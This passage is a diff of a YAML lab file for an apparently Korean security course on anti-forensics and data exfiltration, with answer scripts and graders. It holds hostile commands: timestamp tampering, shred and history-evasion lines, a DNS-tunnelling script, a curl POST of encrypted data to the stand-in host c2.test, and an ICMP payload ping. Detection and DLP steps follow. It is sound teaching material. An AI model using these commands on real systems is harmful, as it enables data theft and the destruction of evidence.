@@ -1,532 +1,169 @@
 lab_id: battle-adv-ai-week05
-title: 데이터 유출 기법 — Exfiltration over DNS/HTTPS (AI 지원)
+title: 안티포렌식과 데이터 유출 — 은닉과 탐지의 대결 (AI 지원)
 version: ai
 course: battle-adv-ai
 week: 5
-description: 데이터 유출(Exfiltration) 기법을 심층 분석한다. DNS, HTTPS, 스테가노그래피, 암호화 채널 등 다양한 유출 경로와 이에 대한 탐지 및 DLP(Data Loss Prevention) 전략을 실습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: 안티포렌식(Anti-Forensics) 기법과 데이터 유출(Exfiltration) 기법을 분석한다. Red Phase에서 로그 삭제, 타임스탬프 조작, 멀티채널 유출을 시뮬레이션하고, Blue Phase에서 DLP 규칙, 엔트로피 분석, NetFlow 기반 탐지를 구현한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 150
 objectives:
-- DNS 기반 데이터 유출 기법의 원리와 구현을 이해한다
-- HTTPS를 이용한 암호화 채널 유출 기법을 실습한다
-- DLP 시스템의 탐지 원리와 우회 기법을 분석한다
-- 데이터 유출 탐지 및 차단 전략을 수립한다
+- 안티포렌식 기법(로그 삭제, 타임스탬프 조작)을 이해한다
+- DNS, HTTPS, ICMP를 이용한 데이터 유출 기법을 실습한다
+- DLP 규칙과 엔트로피 기반 탐지를 구현한다
+prerequisites:
+- battle-adv-nonai week04 이수
+infra_requirements:
+- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
+- secu (10.20.30.1) — nftables, suricata
+- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
+- siem (10.20.30.100) — wazuh-manager
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: 유출 대상이 될 민감 데이터를 시뮬레이션으로 생성하라. 가짜 고객 정보(이름, 이메일, 카드번호)를 100건 생성하라.
-  hint: Python의 faker 또는 간단한 스크립트로 가짜 데이터를 생성한다.
+  instruction: '[RED] 유출 대상이 될 가짜 민감 데이터(이름, 이메일, 카드번호) 100건을 생성하라.'
+  hint: Python 스크립트로 가짜 PII 데이터를 CSV 형식으로 생성한다.
   category: recon
   points: 10
-  answer: "python3 -c \"\nimport random, string, hashlib\nwith open('/tmp/sensitive_data.csv', 'w') as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n        name = f'User_{i:03d}'\n\
-    \        email = f'user{i}@example.com'\n        card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n        ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
+  answer: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w') as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n        name = f'User_{i:03d}'\n       \
+    \ email = f'user{i}@example.com'\n        card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n        ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
     \        f.write(f'{name},{email},{card},{ssn}\\n')\nprint('Generated 100 fake records')\n\" && wc -l /tmp/sensitive_data.csv"
-  answer_detail: 데이터 유출 실습을 위해 가짜 민감 데이터(PII)를 생성한다. 실제 데이터를 사용하면 안 되므로, 형식은 실제와 동일하지만 가짜인 데이터를 사용한다. 카드번호(16자리), SSN(XXX-XX-XXXX) 형식은 DLP 규칙 테스트에 활용된다.
+  answer_detail: 데이터 유출 실습을 위해 가짜 PII를 생성한다. 형식은 실제와 동일하지만 가짜인 데이터를 사용하며, 카드번호(16자리)와 SSN(XXX-XX-XXXX) 형식은 DLP 규칙 테스트에 활용된다.
   verify:
     type: output_contains
     expect: 100 fake records
   target_vm: attacker
-  script: "python3 -c \"\nimport random, string, hashlib\nwith open('/tmp/sensitive_data.csv', 'w') as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n        name = f'User_{i:03d}'\n\
-    \        email = f'user{i}@example.com'\n        card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n        ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
+  script: "python3 -c \"\nimport random\nwith open('/tmp/sensitive_data.csv', 'w') as f:\n    f.write('name,email,card_number,ssn\\n')\n    for i in range(100):\n        name = f'User_{i:03d}'\n       \
+    \ email = f'user{i}@example.com'\n        card = '4' + ''.join([str(random.randint(0,9)) for _ in range(15)])\n        ssn = f'{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}'\n\
     \        f.write(f'{name},{email},{card},{ssn}\\n')\nprint('Generated 100 fake records')\n\" && wc -l /tmp/sensitive_data.csv"
   risk_level: low
 - order: 2
-  instruction: DNS 터널링을 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 base64로 인코딩하여 DNS TXT 쿼리에 포함시키는 스크립트를 작성하라.
-  hint: 데이터를 63바이트 청크로 분할하여 서브도메인에 포함한다.
+  instruction: '[RED] 안티포렌식 기법을 시뮬레이션하라. 타임스탬프 조작(touch -t), 로그 삭제 흔적 생성, 파일 시큐어 삭제를 실습하라. (시뮬레이션 파일에 대해서만 수행)'
+  hint: touch -t로 타임스탬프를 변경하고, shred로 시큐어 삭제를 시뮬레이션한다.
   category: exploit
   points: 10
-  answer: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\n# DNS Exfiltration Simulation\nDATA=$(head -5 /tmp/sensitive_data.csv | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration\
-    \ Simulation ===\"\necho \"Total encoded size: ${#DATA} bytes\"\necho \"Chunk size: $CHUNK_SIZE bytes\"\necho \"Estimated queries: $(( (${#DATA} + CHUNK_SIZE - 1) / CHUNK_SIZE ))\"\necho \"\"\nwhile\
-    \ [ ${#DATA} -gt 0 ]; do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n    DATA=${DATA:$CHUNK_SIZE}\n    echo \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\n    SEQ=$((SEQ + 1))\n    if [ $SEQ -ge\
-    \ 5 ]; then echo \"... (truncated)\"; break; fi\ndone\nSCRIPT\nbash /tmp/dns_exfil.sh"
-  answer_detail: DNS Exfiltration(T1048.001)은 DNS 프로토콜을 데이터 전송 채널로 악용한다. 데이터를 base64 인코딩 후 DNS 레이블 최대 길이(63바이트)에 맞춰 분할하여 서브도메인으로 전송한다. DNS는 거의 모든 네트워크에서 허용되므로 방화벽 우회에 효과적이다.
+  answer: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt && stat /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01 ---" && echo "Log
+    deletion simulation:" && echo "shred -vfz -n 5 /tmp/af_test.txt (would securely delete)" && echo "History evasion: export HISTFILE=/dev/null" && echo "Anti-forensic techniques documented (T1070)"'
+  answer_detail: 안티포렌식(T1070)은 공격 흔적을 제거하는 기법이다. touch -t로 타임스탬프를 조작하여 타임라인 분석을 방해하고, shred로 파일을 복구 불가능하게 삭제한다. HISTFILE=/dev/null로 명령 기록을 남기지 않는다.
+  verify:
+    type: output_contains
+    expect: anti-forensic
+  target_vm: attacker
+  script: 'echo "anti-forensic test" > /tmp/af_test.txt && touch -t 202301010000 /tmp/af_test.txt && stat /tmp/af_test.txt | grep Modify && echo "--- Timestamp manipulated to 2023-01-01 ---" && echo "Log
+    deletion simulation:" && echo "shred -vfz -n 5 /tmp/af_test.txt (would securely delete)" && echo "History evasion: export HISTFILE=/dev/null" && echo "Anti-forensic techniques documented (T1070)"'
+  risk_level: medium
+- order: 3
+  instruction: '[RED] DNS 터널링을 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 base64로 인코딩하여 DNS 쿼리에 포함시키는 스크립트를 작성하라.'
+  hint: 데이터를 50바이트 청크로 분할하여 서브도메인에 포함한다.
+  category: exploit
+  points: 10
+  answer: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration Simulation ===\"\necho \"Total\
+    \ encoded size: ${#DATA} bytes\"\nwhile [ ${#DATA} -gt 0 ]; do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n    DATA=${DATA:$CHUNK_SIZE}\n    echo \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\n\
+    \    SEQ=$((SEQ + 1))\n    if [ $SEQ -ge 5 ]; then echo \"... (truncated)\"; break; fi\ndone\nSCRIPT\nbash /tmp/dns_exfil.sh"
+  answer_detail: DNS Exfiltration(T1048.001)은 DNS 프로토콜을 데이터 전송 채널로 악용한다. 거의 모든 네트워크에서 DNS가 허용되므로 방화벽 우회에 효과적이다.
   verify:
     type: output_contains
     expect: DNS Exfiltration
   target_vm: attacker
-  script: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\n# DNS Exfiltration Simulation\nDATA=$(head -5 /tmp/sensitive_data.csv | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration\
-    \ Simulation ===\"\necho \"Total encoded size: ${#DATA} bytes\"\necho \"Chunk size: $CHUNK_SIZE bytes\"\necho \"Estimated queries: $(( (${#DATA} + CHUNK_SIZE - 1) / CHUNK_SIZE ))\"\necho \"\"\nwhile\
-    \ [ ${#DATA} -gt 0 ]; do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n    DATA=${DATA:$CHUNK_SIZE}\n    echo \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\n    SEQ=$((SEQ + 1))\n    if [ $SEQ -ge\
-    \ 5 ]; then echo \"... (truncated)\"; break; fi\ndone\nSCRIPT\nbash /tmp/dns_exfil.sh"
-  risk_level: medium
-- order: 3
-  instruction: HTTPS를 이용한 데이터 유출을 시뮬레이션하라. 민감 데이터를 암호화하여 정상 HTTPS 요청에 포함시키는 방법을 시연하라.
-  hint: openssl로 데이터를 암호화하고 curl로 POST 요청에 포함한다.
-  category: exploit
-  points: 10
-  answer: 'cat > /tmp/https_exfil.sh << ''SCRIPT''
-
-    #!/bin/bash
-
-    echo "=== HTTPS Exfiltration Simulation ==="
-
-    # Step 1: Compress and encrypt data
-
-    gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz
-
-    openssl enc -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null
-
-    ENC_SIZE=$(stat -f%z /tmp/exfil_encrypted.bin 2>/dev/null || stat -c%s /tmp/exfil_encrypted.bin)
-
-    echo "Original: $(wc -c < /tmp/sensitive_data.csv) bytes"
-
-    echo "Compressed+Encrypted: $ENC_SIZE bytes"
-
-    echo ""
-
-    echo "Exfil methods:"
-
-    echo "1. POST as file upload: curl -X POST https://c2.test/upload -F ''file=@/tmp/exfil_encrypted.bin''"
-
-    echo "2. Base64 in JSON: curl -X POST https://api.test/log -d ''{\"data\":\"''$(base64 /tmp/exfil_encrypted.bin | head -c 50)''...\"}''"
-
-    echo "3. Steganography: embed in image EXIF/pixels"
-
-    echo "4. Cloud storage: Upload to legitimate cloud service"
-
-    SCRIPT
-
-    bash /tmp/https_exfil.sh'
-  answer_detail: HTTPS Exfiltration(T1048.002)은 암호화된 HTTPS 트래픽에 유출 데이터를 은닉한다. 데이터를 압축→암호화→인코딩하여 정상 HTTP 요청(파일 업로드, JSON 페이로드, API 호출)에 포함시키면 TLS 복호화 없이는 내용을 확인할 수 없다.
-  verify:
-    type: output_contains
-    expect: HTTPS Exfiltration
-  target_vm: attacker
-  script: 'cat > /tmp/https_exfil.sh << ''SCRIPT''
-
-    #!/bin/bash
-
-    echo "=== HTTPS Exfiltration Simulation ==="
-
-    # Step 1: Compress and encrypt data
-
-    gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz
-
-    openssl enc -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null
-
-    ENC_SIZE=$(stat -f%z /tmp/exfil_encrypted.bin 2>/dev/null || stat -c%s /tmp/exfil_encrypted.bin)
-
-    echo "Original: $(wc -c < /tmp/sensitive_data.csv) bytes"
-
-    echo "Compressed+Encrypted: $ENC_SIZE bytes"
-
-    echo ""
-
-    echo "Exfil methods:"
-
-    echo "1. POST as file upload: curl -X POST https://c2.test/upload -F ''file=@/tmp/exfil_encrypted.bin''"
-
-    echo "2. Base64 in JSON: curl -X POST https://api.test/log -d ''{\"data\":\"''$(base64 /tmp/exfil_encrypted.bin | head -c 50)''...\"}''"
-
-    echo "3. Steganography: embed in image EXIF/pixels"
-
-    echo "4. Cloud storage: Upload to legitimate cloud service"
-
-    SCRIPT
-
-    bash /tmp/https_exfil.sh'
+  script: "cat > /tmp/dns_exfil.sh << 'SCRIPT'\n#!/bin/bash\nDATA=$(head -5 /tmp/sensitive_data.csv | base64 | tr -d '\\n')\nCHUNK_SIZE=50\nSEQ=0\necho \"=== DNS Exfiltration Simulation ===\"\necho \"Total\
+    \ encoded size: ${#DATA} bytes\"\nwhile [ ${#DATA} -gt 0 ]; do\n    CHUNK=${DATA:0:$CHUNK_SIZE}\n    DATA=${DATA:$CHUNK_SIZE}\n    echo \"Query $SEQ: nslookup ${CHUNK}.seq${SEQ}.exfil.test.local\"\n\
+    \    SEQ=$((SEQ + 1))\n    if [ $SEQ -ge 5 ]; then echo \"... (truncated)\"; break; fi\ndone\nSCRIPT\nbash /tmp/dns_exfil.sh"
   risk_level: medium
 - order: 4
-  instruction: 스테가노그래피를 이용한 데이터 은닉을 시뮬레이션하라. 이미지 파일의 LSB(Least Significant Bit)에 데이터를 숨기는 원리를 분석하라.
-  hint: Python으로 간단한 LSB 스테가노그래피 시뮬레이션을 작성한다.
+  instruction: '[RED] HTTPS와 ICMP를 이용한 멀티채널 유출을 시뮬레이션하라. 데이터를 암호화하여 HTTPS POST에 포함하고, ICMP 페이로드에도 은닉하라.'
+  hint: openssl로 암호화하고 curl로 POST, ping -p로 ICMP 데이터를 전송한다.
   category: exploit
   points: 10
-  answer: 'python3 -c "
-
-    import struct
-
-    # LSB Steganography Simulation
-
-    data = ''SECRET_EXFIL_DATA''
-
-    binary_data = ''''.join(format(ord(c), ''08b'') for c in data)
-
-    print(''=== LSB Steganography Simulation ==='')
-
-    print(f''Original data: {data}'')
-
-    print(f''Binary representation: {binary_data[:40]}...'')
-
-    print(f''Bits needed: {len(binary_data)}'')
-
-    print(f''Pixels needed (RGB): {len(binary_data) // 3 + 1}'')
-
-    print(f''Min image size: ~{len(binary_data) // 3 + 1} pixels (e.g., 4x4 PNG)'')
-
-    print()
-
-    print(''LSB embedding example:'')
-
-    print(''Original pixel: R=142(10001110) G=87(01010111) B=203(11001011)'')
-
-    print(''With hidden bit 1,0,1: R=143(10001111) G=86(01010110) B=203(11001011)'')
-
-    print(''Change: invisible to human eye (1-bit difference per channel)'')
-
-    print()
-
-    print(f''Capacity: 1920x1080 image = {1920*1080*3//8:,} bytes hidden data'')
-
-    "'
-  answer_detail: 스테가노그래피(T1001.002)는 정상 파일(이미지, 오디오)에 데이터를 은닉하는 기법이다. LSB 방식은 각 픽셀의 최하위 비트를 변경하여 데이터를 숨기며, 1비트 변화는 육안으로 구분할 수 없다. 1920x1080 이미지에 약 760KB의 데이터를 숨길 수 있다.
-  verify:
-    type: output_contains
-    expect: LSB Steganography
-  target_vm: attacker
-  script: 'python3 -c "
-
-    import struct
-
-    # LSB Steganography Simulation
-
-    data = ''SECRET_EXFIL_DATA''
-
-    binary_data = ''''.join(format(ord(c), ''08b'') for c in data)
-
-    print(''=== LSB Steganography Simulation ==='')
-
-    print(f''Original data: {data}'')
-
-    print(f''Binary representation: {binary_data[:40]}...'')
-
-    print(f''Bits needed: {len(binary_data)}'')
-
-    print(f''Pixels needed (RGB): {len(binary_data) // 3 + 1}'')
-
-    print(f''Min image size: ~{len(binary_data) // 3 + 1} pixels (e.g., 4x4 PNG)'')
-
-    print()
-
-    print(''LSB embedding example:'')
-
-    print(''Original pixel: R=142(10001110) G=87(01010111) B=203(11001011)'')
-
-    print(''With hidden bit 1,0,1: R=143(10001111) G=86(01010110) B=203(11001011)'')
-
-    print(''Change: invisible to human eye (1-bit difference per channel)'')
-
-    print()
-
-    print(f''Capacity: 1920x1080 image = {1920*1080*3//8:,} bytes hidden data'')
-
-    "'
-  risk_level: medium
-- order: 5
-  instruction: 데이터를 분할하여 여러 채널로 동시에 유출하는 멀티채널 유출 기법을 시뮬레이션하라. DNS, HTTPS, ICMP를 동시에 사용하는 시나리오를 설계하라.
-  hint: 데이터를 3분할하여 각각 다른 프로토콜로 전송하는 구조를 설계한다.
-  category: exploit
-  points: 10
-  answer: "cat > /tmp/multichannel_exfil.txt << 'EOF'\n=== Multi-Channel Exfiltration Simulation ===\n\nData: /tmp/sensitive_data.csv (100 records)\nSplit: 3 chunks for parallel exfiltration\n\nChannel\
-    \ 1 - DNS (T1048.001):\n  Data: Records 1-33 (base64 encoded in subdomains)\n  Rate: 1 query/second (low and slow)\n  Bandwidth: ~50 bytes/query\n  Detection difficulty: HIGH\n\nChannel 2 - HTTPS POST\
-    \ (T1048.002):\n  Data: Records 34-66 (AES encrypted, JSON payload)\n  Rate: 1 request/30 seconds\n  Bandwidth: ~1KB/request\n  Detection difficulty: VERY HIGH (encrypted)\n\nChannel 3 - ICMP (T1048.003):\n\
-    \  Data: Records 67-100 (embedded in ping payload)\n  Rate: 1 ping/5 seconds\n  Bandwidth: ~64 bytes/packet\n  Detection difficulty: MEDIUM\n\nTotal exfil time: ~30 minutes for 100 records\nAdvantage:\
-    \ If one channel is detected/blocked, others continue\nEOF\ncat /tmp/multichannel_exfil.txt"
-  answer_detail: 멀티채널 유출은 데이터를 분할하여 여러 프로토콜로 동시에 전송함으로써 단일 채널 차단으로 유출을 완전히 막을 수 없게 만든다. DNS(탐지 어려움), HTTPS(내용 암호화), ICMP(간과되기 쉬움)를 조합하면 최소 하나의 채널은 성공할 가능성이 높다.
+  answer: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null &&
+    echo "=== Multi-Channel Exfiltration ===" && echo "Channel 1 - HTTPS: curl -X POST https://c2.test/upload -F file=@/tmp/exfil_encrypted.bin" && echo "Channel 2 - ICMP:" && echo -n "EXFIL_TEST" | xxd
+    -p | head -c 32 > /tmp/icmp_payload.txt && ping -c 1 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1 | head -3 && echo "Multi-channel exfiltration simulated"'
+  answer_detail: 멀티채널 유출은 데이터를 분할하여 여러 프로토콜로 동시에 전송한다. HTTPS(암호화), ICMP(간과되기 쉬움)를 조합하면 단일 채널 차단으로 유출을 완전히 막을 수 없다.
   verify:
     type: output_contains
     expect: Multi-Channel
   target_vm: attacker
-  script: "cat > /tmp/multichannel_exfil.txt << 'EOF'\n=== Multi-Channel Exfiltration Simulation ===\n\nData: /tmp/sensitive_data.csv (100 records)\nSplit: 3 chunks for parallel exfiltration\n\nChannel\
-    \ 1 - DNS (T1048.001):\n  Data: Records 1-33 (base64 encoded in subdomains)\n  Rate: 1 query/second (low and slow)\n  Bandwidth: ~50 bytes/query\n  Detection difficulty: HIGH\n\nChannel 2 - HTTPS POST\
-    \ (T1048.002):\n  Data: Records 34-66 (AES encrypted, JSON payload)\n  Rate: 1 request/30 seconds\n  Bandwidth: ~1KB/request\n  Detection difficulty: VERY HIGH (encrypted)\n\nChannel 3 - ICMP (T1048.003):\n\
-    \  Data: Records 67-100 (embedded in ping payload)\n  Rate: 1 ping/5 seconds\n  Bandwidth: ~64 bytes/packet\n  Detection difficulty: MEDIUM\n\nTotal exfil time: ~30 minutes for 100 records\nAdvantage:\
-    \ If one channel is detected/blocked, others continue\nEOF\ncat /tmp/multichannel_exfil.txt"
+  script: 'gzip -c /tmp/sensitive_data.csv > /tmp/exfil_payload.gz && openssl enc -aes-256-cbc -salt -in /tmp/exfil_payload.gz -out /tmp/exfil_encrypted.bin -pass pass:ExfilKey2026 -pbkdf2 2>/dev/null &&
+    echo "=== Multi-Channel Exfiltration ===" && echo "Channel 1 - HTTPS: curl -X POST https://c2.test/upload -F file=@/tmp/exfil_encrypted.bin" && echo "Channel 2 - ICMP:" && echo -n "EXFIL_TEST" | xxd
+    -p | head -c 32 > /tmp/icmp_payload.txt && ping -c 1 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1 | head -3 && echo "Multi-channel exfiltration simulated"'
   risk_level: medium
-- order: 6
-  instruction: DNS 기반 유출을 탐지하기 위한 분석을 수행하라. DNS 쿼리 로그에서 비정상 패턴(높은 엔트로피, 긴 도메인, 높은 빈도)을 식별하는 스크립트를 작성하라.
-  hint: Shannon 엔트로피 계산으로 인코딩된 DNS 쿼리를 탐지한다.
+- order: 5
+  instruction: '[BLUE] Phase 전환 — DNS 유출을 탐지하기 위한 Shannon 엔트로피 분석 스크립트를 작성하라. 엔트로피 3.5 이상이고 길이 30 이상인 쿼리를 의심 대상으로 판정하라.'
+  hint: Python으로 Shannon 엔트로피를 계산하고 정상/비정상 쿼리를 비교한다.
   category: defense
   points: 10
-  answer: "python3 -c \"\nimport math\nfrom collections import Counter\n\ndef shannon_entropy(s):\n    freq = Counter(s)\n    length = len(s)\n    return -sum((count/length) * math.log2(count/length) for\
-    \ count in freq.values())\n\nqueries = [\n    'www.google.com',\n    'mail.example.org',\n    'U2VjcmV0X0V4Zml.seq0.exfil.test.local',\n    'bERhdGFfMjAyNg.seq1.exfil.test.local',\n    'update.microsoft.com',\n\
-    \    'YWJjZGVmZ2hpamts.seq2.exfil.test.local',\n]\nprint('=== DNS Exfiltration Detection via Entropy ===')\nprint(f'{\"Query\":<50} {\"Length\":>6} {\"Entropy\":>8} {\"Suspicious\":>10}')\nprint('-'\
-    \ * 80)\nfor q in queries:\n    e = shannon_entropy(q.split('.')[0])\n    l = len(q)\n    suspicious = 'YES' if e > 3.5 and l > 30 else 'NO'\n    print(f'{q:<50} {l:>6} {e:>8.2f} {suspicious:>10}')\n\
-    print()\nprint('Threshold: Entropy > 3.5 AND Length > 30 → Suspicious')\n\""
-  answer_detail: DNS 유출 탐지의 핵심은 Shannon 엔트로피 분석이다. 정상 도메인(www.google.com)은 엔트로피가 낮고(~2.5), base64 인코딩된 유출 쿼리는 엔트로피가 높다(>3.5). 쿼리 길이와 엔트로피를 결합하면 DNS 터널링을 높은 정확도로 탐지할 수 있다.
+  answer: "python3 -c \"\nimport math\nfrom collections import Counter\ndef shannon_entropy(s):\n    freq = Counter(s)\n    length = len(s)\n    return -sum((count/length) * math.log2(count/length) for\
+    \ count in freq.values())\nqueries = [\n    'www.google.com',\n    'mail.example.org',\n    'U2VjcmV0X0V4Zml.seq0.exfil.test.local',\n    'YWJjZGVmZ2hpamts.seq2.exfil.test.local',\n    'update.microsoft.com',\n\
+    ]\nprint('=== DNS Exfiltration Detection via Entropy ===')\nprint(f'{chr(34)+\"Query\"+chr(34):<50} {\"Length\":>6} {\"Entropy\":>8} {\"Suspicious\":>10}')\nfor q in queries:\n    e = shannon_entropy(q.split('.')[0])\n\
+    \    l = len(q)\n    suspicious = 'YES' if e > 3.5 and l > 30 else 'NO'\n    print(f'{q:<50} {l:>6} {e:>8.2f} {suspicious:>10}')\nprint('Threshold: Entropy > 3.5 AND Length > 30')\n\""
+  answer_detail: 정상 도메인은 엔트로피가 낮고(~2.5), base64 인코딩된 유출 쿼리는 엔트로피가 높다(>3.5). 쿼리 길이와 엔트로피를 결합하면 DNS 터널링을 높은 정확도로 탐지할 수 있다.
   verify:
     type: output_contains
     expect: DNS Exfiltration Detection
-  target_vm: attacker
-  script: "python3 -c \"\nimport math\nfrom collections import Counter\n\ndef shannon_entropy(s):\n    freq = Counter(s)\n    length = len(s)\n    return -sum((count/length) * math.log2(count/length) for\
-    \ count in freq.values())\n\nqueries = [\n    'www.google.com',\n    'mail.example.org',\n    'U2VjcmV0X0V4Zml.seq0.exfil.test.local',\n    'bERhdGFfMjAyNg.seq1.exfil.test.local',\n    'update.microsoft.com',\n\
-    \    'YWJjZGVmZ2hpamts.seq2.exfil.test.local',\n]\nprint('=== DNS Exfiltration Detection via Entropy ===')\nprint(f'{\"Query\":<50} {\"Length\":>6} {\"Entropy\":>8} {\"Suspicious\":>10}')\nprint('-'\
-    \ * 80)\nfor q in queries:\n    e = shannon_entropy(q.split('.')[0])\n    l = len(q)\n    suspicious = 'YES' if e > 3.5 and l > 30 else 'NO'\n    print(f'{q:<50} {l:>6} {e:>8.2f} {suspicious:>10}')\n\
-    print()\nprint('Threshold: Entropy > 3.5 AND Length > 30 → Suspicious')\n\""
+  target_vm: secu
+  script: "python3 -c \"\nimport math\nfrom collections import Counter\ndef shannon_entropy(s):\n    freq = Counter(s)\n    length = len(s)\n    return -sum((count/length) * math.log2(count/length) for\
+    \ count in freq.values())\nqueries = [\n    'www.google.com',\n    'mail.example.org',\n    'U2VjcmV0X0V4Zml.seq0.exfil.test.local',\n    'YWJjZGVmZ2hpamts.seq2.exfil.test.local',\n    'update.microsoft.com',\n\
+    ]\nprint('=== DNS Exfiltration Detection via Entropy ===')\nprint(f'{chr(34)+\"Query\"+chr(34):<50} {\"Length\":>6} {\"Entropy\":>8} {\"Suspicious\":>10}')\nfor q in queries:\n    e = shannon_entropy(q.split('.')[0])\n\
+    \    l = len(q)\n    suspicious = 'YES' if e > 3.5 and l > 30 else 'NO'\n    print(f'{q:<50} {l:>6} {e:>8.2f} {suspicious:>10}')\nprint('Threshold: Entropy > 3.5 AND Length > 30')\n\""
   risk_level: low
-- order: 7
-  instruction: HTTPS 유출을 탐지하기 위한 TLS 검사 전략을 수립하라. SSL/TLS 인터셉트(MITM) 프록시의 설정과 한계를 분석하라.
-  hint: mitmproxy 또는 squid SSL bump의 원리와 설정을 정리한다.
-  category: defense
-  points: 10
-  answer: "cat > /tmp/tls_inspection.txt << 'EOF'\n=== TLS Inspection Strategy for HTTPS Exfiltration Detection ===\n\n1. TLS Interception Architecture:\n   Client → Corporate CA Proxy → Internet\n   -\
-    \ Proxy generates dynamic cert signed by corporate CA\n   - Corporate CA trusted on all endpoints\n\n2. Implementation (Squid SSL Bump):\n   http_port 3128 ssl-bump cert=/etc/squid/ca.pem\n   ssl_bump\
-    \ bump all\n   acl exfil_patterns url_regex -i upload|post|submit\n\n3. Detection Rules:\n   - Large POST requests (>100KB) to unknown domains\n   - High entropy payload content\n   - Connections to\
-    \ recently registered domains (<30 days)\n   - Unusual User-Agent strings\n\n4. Limitations:\n   - Certificate pinning breaks inspection (mobile apps, APIs)\n   - Privacy concerns (employee monitoring)\n\
-    \   - Performance overhead (CPU for decryption)\n   - HSTS/HPKP may cause errors\n\n5. Alternative: Metadata analysis without decryption\n   - JA3 fingerprint\n   - TLS certificate analysis\n   - Connection\
-    \ timing and volume patterns\nEOF\ncat /tmp/tls_inspection.txt"
-  answer_detail: TLS 검사(SSL/TLS Interception)는 HTTPS 트래픽의 내용을 검사하여 유출을 탐지하는 방법이다. 프록시가 동적 인증서를 생성하여 MITM 역할을 수행한다. 하지만 Certificate Pinning, 개인정보 문제, 성능 오버헤드 등의 한계가 있어 메타데이터 분석을 병행한다.
-  verify:
-    type: output_contains
-    expect: TLS Inspection
-  target_vm: attacker
-  script: "cat > /tmp/tls_inspection.txt << 'EOF'\n=== TLS Inspection Strategy for HTTPS Exfiltration Detection ===\n\n1. TLS Interception Architecture:\n   Client → Corporate CA Proxy → Internet\n   -\
-    \ Proxy generates dynamic cert signed by corporate CA\n   - Corporate CA trusted on all endpoints\n\n2. Implementation (Squid SSL Bump):\n   http_port 3128 ssl-bump cert=/etc/squid/ca.pem\n   ssl_bump\
-    \ bump all\n   acl exfil_patterns url_regex -i upload|post|submit\n\n3. Detection Rules:\n   - Large POST requests (>100KB) to unknown domains\n   - High entropy payload content\n   - Connections to\
-    \ recently registered domains (<30 days)\n   - Unusual User-Agent strings\n\n4. Limitations:\n   - Certificate pinning breaks inspection (mobile apps, APIs)\n   - Privacy concerns (employee monitoring)\n\
-    \   - Performance overhead (CPU for decryption)\n   - HSTS/HPKP may cause errors\n\n5. Alternative: Metadata analysis without decryption\n   - JA3 fingerprint\n   - TLS certificate analysis\n   - Connection\
-    \ timing and volume patterns\nEOF\ncat /tmp/tls_inspection.txt"
-  risk_level: low
-- order: 8
-  instruction: DLP(Data Loss Prevention) 규칙을 작성하라. 신용카드 번호, SSN, 이메일 대량 전송을 탐지하는 정규식 기반 DLP 규칙을 구현하라.
+- order: 6
+  instruction: '[BLUE] DLP(Data Loss Prevention) 규칙을 작성하라. 신용카드 번호, SSN, 이메일 대량 전송을 탐지하는 정규식 기반 DLP 규칙을 구현하라.'
   hint: 정규식으로 PII 패턴을 정의하고 임계값을 설정한다.
   category: defense
   points: 10
-  answer: "python3 -c \"\nimport re\n\n# DLP Rules\nrules = {\n    'credit_card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk':\
